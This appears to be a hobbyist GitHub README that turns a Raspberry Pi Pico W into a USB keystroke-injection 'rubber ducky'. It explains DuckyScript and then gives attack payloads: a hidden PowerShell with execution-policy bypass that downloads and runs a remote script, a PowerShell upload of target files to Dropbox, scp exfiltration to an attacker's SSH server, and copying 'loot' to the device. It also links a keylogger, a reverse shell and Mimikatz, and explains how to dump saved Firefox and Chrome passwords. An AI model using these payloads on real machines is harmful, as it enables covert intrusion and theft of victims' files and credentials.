# Introduction
I recently came across [Hak5's Rubbber Ducky](https://github.com/hak5/usbrubberducky-payloads#about-the-new-usb-rubber-ducky) USB drives and how they are capable of stealthily injecting and executing payloads within any target device and compromise them within a matter of seconds. Since I had access to a Raspberry Pi Pico W I tried to emulate this functionality with it too.

The basic working of a "Rubber Ducky" boils down to when it is connected to the target device, it behaves as a USB HID such as a keyboard, mouse etc and can therefore execute keystrokes and clicks just like how a human would on a computer without raising any flags making it extremely efficient and stealthy.

## Table of contents 
- [Configuring the Pico W](#configuring-the-raspberry-pico-w-ducky)
- [Payloads](#payloads)
- [Decrypting](#decrypting-passwords)

## Configuring the Raspberry Pico W Ducky

- Download the [CircuitPython]([https://circuitpython.org/](https://circuitpython.org/board/raspberry_pi_pico_w/)) configuration files.
- Copy the `adafruit-circuitpython-raspberry_pi_pico_w-en_US-8.0.0.uf2` file to the root of the Pico `RPI-RP2`. The device will reboot and after a second or so, it will reconnect as `CIRCUITPY`.
- Download the .zip file from the [pico-ducky quick setup guide](https://github.com/dbisu/pico-ducky/releases) from [dbisu's repo](https://github.com/dbisu/pico-ducky) and extract it.
- Once the device reappears, copy the lib folder,  and all the .py files into it from the extracted folder to prepare it to accept payloads.
- `payloads` folder in this repo has some interesting payloads. Replace `.txt` extension with `.dd` after copying a payload into the root directory of the ducky.

### Entering Setup Mode:
- To edit the payload, enter setup mode by connecting the pin 1 (GP0) to pin 3 (GND) on the pico board. This will stop the pico-ducky from injecting the payload into your own machine. The easiest way to do so is by using a jumper wire between those pins as seen below.

- Be careful, if your device isn't in setup mode, the device will reboot and after half a second, the script will run.

### Resetting the Pico:
- Follow these instructions if your Pico ends up in an odd state

1. Download the reset firmware from [flash_nuke.uf2](https://datasheets.raspberrypi.com/soft/flash_nuke.uf2).
2. While holding the white BOOTSEL button on the Pico, plug in the USB cable to your computer.
3. When the RPI-RP2 drive shows up on your computer, copy the `flash_nuke.uf2` file into the Pico.
4. After the device reboots, follow the install instructions [here](https://github.com/SourasishBasu/PicoW-Ducky/blob/main/README.md)

# Payloads

In the context of the USB Rubber Ducky, a "payload" refers to a script or a set of commands that the USB Rubber Ducky executes when it is connected to a target computer. The USB Rubber Ducky is a keystroke injection tool that emulates a keyboard and can execute pre-defined scripts to perform various tasks on a target computer.

These scripts are often written in DuckyScript developed by Hak5 which consists of simple word commands to perform a variety of tasks. Some popular commands are:

### `REM` and `//`

They are comments. Any line starting with them is ignored.

```
BEGINNING OF PAYLOAD

REM Title: Example Payload
REM Description: Opens hidden powershell and

REM Command Block Explanation
Command 1
Command 2
```

### `DEFAULTDELAY` and `DELAY`

`DEFAULTDELAY` specifies how long (in milliseconds) to wait between **`each line of command`**.

If unspecified, `DEFAULTDELAY` is 18ms.

```
DEFAULTDELAY 100
// ducky will wait 100ms between each subsequent command
```

`DELAY` creates a pause in script execution. Useful for waiting for UI to catch up.

```
DELAY 1000
// waits 1000 milliseconds, or 1 second
```

### `STRING` and `STRINGLN`

`STRING` types out whatever after it **`as-is`**.

```
REM Run a hidden powershell
STRING powershell -windowstyle hidden
```

`STRINGLN` also presses **enter key** at the end.

### `REPEAT`

Repeats the last line **`n`** times.

```
STRING Hello world
REPEAT 10
// types out "Hello world" 11 times (1 original + 10 repeats)
```

### Special Keys

DuckyScript also supports many special keys:

```
CTRL / RCTRL
SHIFT / RSHIFT
ALT / RALT
ESC
ENTER
UP
DOWN
LEFT
RIGHT
SPACE
BACKSPACE
TAB
CAPSLOCK

F1 to F24
```
`GUI`

can be used on its own to emulate the Windows key or combined with special keys:

`GUI r` opens Run.exe on Windows which can be used to launch applications and open links easily.

These commands should help create and understand most payload scripts. For more detailed information on DuckyScript visit Hak5's [Official DuckyScript Guide](https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference).

## Types of Payloads

Today the Rubber Ducky has become an essential part of many CyberSec and IT professionals' toolkits for its efficient and automation capabilities. As a result its community has designed a wide variety of interesting payloads. A huge collection of these scripts are available on Hak5's [Rubber-Ducky repo](https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads) and the official Hak5 [website](https://shop.hak5.org/blogs/payloads/tagged/usb-rubber-ducky).

I have included very few example payload I found interesting mainly in the realm of credential dumping and exfiltration of user information from target device.

### Exfiltration

Exfiltration refers to extracting and transferring information from the target device to attacker via some means. 

#### Transfer via SSH

I used OpenSSH service and the `scp` command to send the files from the target device to a SSH server on my device. 

To turn your Windows 10/11 device into a SSH Server capable of receiving data via `scp`:

- Install OpenSSH Server from Optional Features in Windows 11
- Ensure it is installed by running this command in Powershell 6 or higher:

  ```
  Get-WindowsCapability -Online | ? Name -like 'OpenSSH.Server*'

  Expected Output:
  Name : OpenSSH.Server~~~~0.0.1.0
  State : Installed
  ```

- Check the status of ssh-agent and sshd services using the PowerShell Get-Service command:

  ```
  Get-Service -Name *ssh*
  ```

- By default, both services are stopped. Run the following commands to start OpenSSH services:

  ```
  Start-Service sshd
  
  Set-Service -Name sshd -StartupType 'Manual'
  
  Start-Service ssh-agent
  
  Set-Service -Name ssh-agent -StartupType 'Manual'
  ```
  
This will run the SSH service until the device is shut down.

- Check if sshd service is running and listening on port TCP/22(default):

  ```
  netstat -nao | find /i '":22"'
  ```

- After ensuring ssh service is running, `scp` command can be used to send files/folders into the device from a remote machine using:

  ```
  scp /dir/file1 /dir/file2 remote_username@remote_IP /remote_dir/folder/
  ```

For an in depth explanation of the SSH service and installation/troubleshooting process refer to this [article](https://theitbros.com/ssh-into-windows/).

#### Upload via Dropbox API
- After verifying Internet Connection, files can be uploaded to Dropbox by using the Dropbox API token and including it in the script. This ensures no file traces exists in the target device. Below is a powershell script that uploads a specified file from the device's %temp% folder to Dropbox using its API.
  
  ```
  $TargetFilePath="/$FileName"
  $SourceFilePath="$env:TMP\$FileName"
  $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
  $authorization = "Bearer " + $DropBoxAccessToken
  $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
  $headers.Add("Authorization", $authorization)
  $headers.Add("Dropbox-API-Arg", $arg)
  $headers.Add("Content-Type", 'application/octet-stream')
  Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
  ```

#### Upload to Discord channel via a discord webhook

  ```
  STRING powershell -w h -ep bypass $discord='

  REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
  DEFINE DISCORD example.com
  STRING DISCORD
  
  REM Reply example.com with YOUR LINK. The Payload should be a .ps1 script
  STRINGLN ';irm PAYLOAD | iex
  ```

#### Send file to Ducky-Pico Storage
- Files may also be stored onto the physical HID pico-ducky storage itself by checking the drive letter assigned to it in the target device file system and copying the files into the drive root directory.
  
  ```
  STRING $destinationLabel = "RPI-RP2"
  ENTER
  STRING $destinationLetter = Get-WmiObject -Class Win32_Volume | where {$_.Label -eq $destinationLabel} | select -expand name
  ENTER
  STRING move-item -Path C:\Windows\Temp\loot -Destination $destinationLetter
  ENTER  
  ```

Some more interesting payloads
- [Ducky KeyLogger](https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/credentials/DuckyLogger)
- [Persistent ReverseShell Ducky](https://github.com/drapl0n/persistentReverseDucky/tree/main)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) is an extremely powerful tool used within some payloads which is capable of extracting Windows user login credentials, hashes, keys, pin codes, tickets from the memory of `LSASS` (Local Security Authority Subsystem Service).

# Decrypting Passwords

Certain payloads are capable of extracting user credentials from the device storage/memory etc by performing very specific attacks. Often these credentials are extracted in the form of excrypted hashes but it is still possible to decrypt and reveal the plaintext login credentials from them via python scripts for example saved browser credentials.

## Firefox
**Firefox Decrypt** is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates.

It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known.
If a profile is not protected by a Master Password, passwords are displayed without prompt.

It requires access to `libnss3`, included with most Mozilla products.

Alternatively, you can install libnss3 (Debian/Ubuntu) or nss (Arch/Gentoo/…). libnss3 is part of https://developer.mozilla.org/docs/Mozilla/Projects/NSS.

### Usage

Run:

```
python firefox_decrypt.py
```

Then, a prompt to enter the *master password* for the profile: 

- if no password was set, no master password will be asked.
- if a password was set and is known, enter it and hit key <kbd>Return</kbd> or <kbd>Enter</kbd>
- if a password was set and is no longer known, you can not proceed

If you don't want to display all passwords on the screen you can use:

```
python firefox_decrypt.py | grep -C2 keyword
```
where `keyword` is part of the expected output (URL, username, email, password …)

You can also choose from one of the supported formats with `--format`:

* `human` - a format displaying one record for every 3 lines
* `csv` - a spreadsheet-like format. See also `--csv-*` options for additional control.
* `tabular` - similar to csv but producing a tab-delimited (`tsv`) file instead.
* `json` - a machine compatible format - see [JSON](https://en.wikipedia.org/wiki/JSON)

##### Non-interactive mode

A non-interactive mode which bypasses all prompts, including profile choice and master password, can be enabled with `-n/--no-interactive`.

You can list all available profiles with `-l/--list` (to stdout).

Your master password is read from stdin.

    $ python firefox_decrypt.py --list
    1 -> l1u1xh65.default
    
    $ read -sp "Master Password: " PASSWORD
    Master Password:

    $ echo $PASSWORD | python firefox_decrypt.py --no-interactive --choice 4
    Website:   https://login.example.com
    Username: 'john.doe'
    Password: '1n53cur3'

    Website:   https://example.org
    Username: 'max.mustermann'
    Password: 'Passwort1234'

    Website:   https://github.com
    Username: 'octocat'
    Password: 'qJZo6FduRcHw'

    [...snip...]

    $ echo $PASSWORD | python firefox_decrypt.py -nc 1
    Website:   https://git-scm.com
    Username: 'foo'
    Password: 'bar'

    Website:   https://gitlab.com
    Username: 'whatdoesthefoxsay'
    Password: 'w00fw00f'

    [...snip...]

    $ # Unset Password
    $ PASSWORD=

##### Format CSV

Passwords may be exported in CSV format using the `--format` flag.

```
python firefox_decrypt.py --format csv
```

##### Non fatal password decryption

By default, encountering a corrupted username or password will abort decryption.
Since version `1.1.0` there is now `--non-fatal-decryption` that tolerates individual failures.

    $ python firefox_decrypt.py --non-fatal-decryption
    (...)
    Website:   https://github.com
    Username: '*** decryption failed ***'
    Password: '*** decryption failed ***'

which can also be combined with any of the above `--format` options.

#### Windows

Both Python and Firefox must be either 32-bit or 64-bit.  

`cmd.exe` is not supported due to it's poor UTF-8 support.
Use [Microsoft Terminal](https://github.com/microsoft/terminal) and install [UTF-8 compatible fonts](https://www.google.com/get/noto/).
Depending on the Terminal settings, the Windows version and the language of your system,
you may also need to force Python to run in `UTF-8` mode with `PYTHONUTF8=1 python firefox_decrypt.py`.

Firefox is a trademark of the Mozilla Foundation in the U.S. and other countries.

### Further Reading
I have covered only the minimum information needed to use this tool. 

- Check out the [Firefox Decrypt tool](https://github.com/unode/firefox_decrypt) from [unode](https://github.com/unode) to learn more about this interesting tool. 

- Refer to this [Medium](https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016) article from [ohyicong](https://github.com/ohyicong) to understand the working behind the decrypting process.

## Chrome

### Usage

Run:

```
python decrypt_chrome_password.py
```

### Working

Refer to this [Medium article](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d) from [ohyicong](https://github.com/ohyicong/decrypt-chrome-passwords) to understand how the decrypting process works.
